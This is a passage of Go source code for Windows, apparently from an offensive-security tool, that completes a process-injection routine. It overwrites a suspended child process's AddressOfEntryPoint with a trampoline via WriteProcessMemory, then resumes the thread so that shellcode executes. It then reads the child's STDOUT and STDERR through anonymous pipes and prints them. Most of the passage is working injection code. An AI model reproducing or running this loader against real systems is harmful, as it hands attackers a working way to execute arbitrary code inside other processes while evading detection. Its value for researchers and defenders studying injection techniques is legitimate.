	epBuffer = append(epBuffer, byte(0xe0))

	if *debug {
		fmt.Println(fmt.Sprintf("[DEBUG]Calling WriteProcessMemory to overwrite AddressofEntryPoint at 0x%x with trampoline: 0x%x...", ep, epBuffer))
	}

	_, _, errWriteProcessMemory2 := WriteProcessMemory.Call(uintptr(procInfo.Process), ep, uintptr(unsafe.Pointer(&epBuffer[0])), uintptr(len(epBuffer)))

	if errWriteProcessMemory2 != nil && errWriteProcessMemory2.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling WriteProcessMemory:\r\n%s", errWriteProcessMemory2.Error()))
	}
	if *verbose {
		fmt.Println("[-]Successfully overwrote the AddressofEntryPoint")
	}

	// Resume the child process
	if *debug {
		fmt.Println("[DEBUG]Calling ResumeThread...")
	}
	_, errResumeThread := windows.ResumeThread(procInfo.Thread)
	if errResumeThread != nil {
		log.Fatal(fmt.Sprintf("[!]Error calling ResumeThread:\r\n%s", errResumeThread.Error()))
	}
	if *verbose {
		fmt.Println("[+]Process resumed and shellcode executed")
	}

	// Close the handle to the child process
	if *debug {
		fmt.Println("[DEBUG]Calling CloseHandle on child process...")
	}
	errCloseProcHandle := windows.CloseHandle(procInfo.Process)
	if errCloseProcHandle != nil {
		log.Fatal(fmt.Sprintf("[!]Error closing the child process handle:\r\n\t%s", errCloseProcHandle.Error()))
	}

	// Close the hand to the child process thread
	if *debug {
		fmt.Println("[DEBUG]Calling CloseHandle on child process thread...")
	}
	errCloseThreadHandle := windows.CloseHandle(procInfo.Thread)
	if errCloseThreadHandle != nil {
		log.Fatal(fmt.Sprintf("[!]Error closing the child process thread handle:\r\n\t%s", errCloseThreadHandle.Error()))
	}

	// Close the write handle the anonymous STDOUT pipe
	errCloseStdOutWrite := windows.CloseHandle(stdOutWrite)
	if errCloseStdOutWrite != nil {
		log.Fatal(fmt.Sprintf("[!]Error closing STDOUT pipe write handle:\r\n\t%s", errCloseStdOutWrite.Error()))
	}

	// Close the read handle to the anonymous STDIN pipe
	errCloseStdInRead := windows.CloseHandle(stdInRead)
	if errCloseStdInRead != nil {
		log.Fatal(fmt.Sprintf("[!]Error closing the STDIN pipe read handle:\r\n\t%s", errCloseStdInRead.Error()))
	}

	// Close the write handle to the anonymous STDERR pipe
	errCloseStdErrWrite := windows.CloseHandle(stdErrWrite)
	if errCloseStdErrWrite != nil {
		log.Fatal(fmt.Sprintf("[!]err closing STDERR pipe write handle:\r\n\t%s", errCloseStdErrWrite.Error()))
	}

	// Read STDOUT from child process
	/*
		BOOL ReadFile(
		HANDLE       hFile,
		LPVOID       lpBuffer,
		DWORD        nNumberOfBytesToRead,
		LPDWORD      lpNumberOfBytesRead,
		LPOVERLAPPED lpOverlapped
		);
	*/
	nNumberOfBytesToRead := make([]byte, 1)
	var stdOutBuffer []byte
	var stdOutDone uint32
	var stdOutOverlapped windows.Overlapped
	if *debug {
		fmt.Println("[DEBUG]Calling ReadFile on STDOUT pipe...")
	}
	for {
		errReadFileStdOut := windows.ReadFile(stdOutRead, nNumberOfBytesToRead, &stdOutDone, &stdOutOverlapped)
		if errReadFileStdOut != nil && errReadFileStdOut.Error() != "The pipe has been ended." {
			log.Fatal(fmt.Sprintf("[!]Error reading from STDOUT pipe:\r\n\t%s", errReadFileStdOut.Error()))
		}
		if int(stdOutDone) == 0 {
			break
		}
		for _, b := range nNumberOfBytesToRead {
			stdOutBuffer = append(stdOutBuffer, b)
		}
	}
	if *verbose {
		fmt.Println(fmt.Sprintf("[-]Finished reading %d bytes from STDOUT", len(stdOutBuffer)))
	}

	// Read STDERR from child process
	var stdErrBuffer []byte
	var stdErrDone uint32
	var stdErrOverlapped windows.Overlapped
	if *debug {
		fmt.Println("[DEBUG]Calling ReadFile on STDERR pipe...")
	}
	for {
		errReadFileStdErr := windows.ReadFile(stdErrRead, nNumberOfBytesToRead, &stdErrDone, &stdErrOverlapped)
		if errReadFileStdErr != nil && errReadFileStdErr.Error() != "The pipe has been ended." {
			log.Fatal(fmt.Sprintf("[!]Error reading from STDOUT pipe:\r\n\t%s", errReadFileStdErr.Error()))
		}
		if int(stdErrDone) == 0 {
			break
		}
		for _, b := range nNumberOfBytesToRead {
			stdErrBuffer = append(stdErrBuffer, b)
		}
	}
	if *verbose {
		fmt.Println(fmt.Sprintf("[-]Finished reading %d bytes from STDERR", len(stdErrBuffer)))
	}

	// Write the data collected from the childprocess' STDOUT to the parent process' STOUTOUT
	if len(stdOutBuffer) > 0 {
		fmt.Println(fmt.Sprintf("[+]Child process STDOUT:\r\n%s", string(stdOutBuffer)))
	}
	if len(stdErrBuffer) > 0 {
		fmt.Println(fmt.Sprintf("[!]Child process STDERR:\r\n%s", string(stdErrBuffer)))
	}
}

// export GOOS=windows GOARCH=amd64;go build -o goCreateProcessWithPipe.exe cmd/CreateProcessWithPipe/main.go
// test STDERR go run .\cmd\CreateProcessWithPipe\main.go -verbose -debug -program "C:\Windows\System32\cmd.exe" -args "/c whoami /asdfasdf"
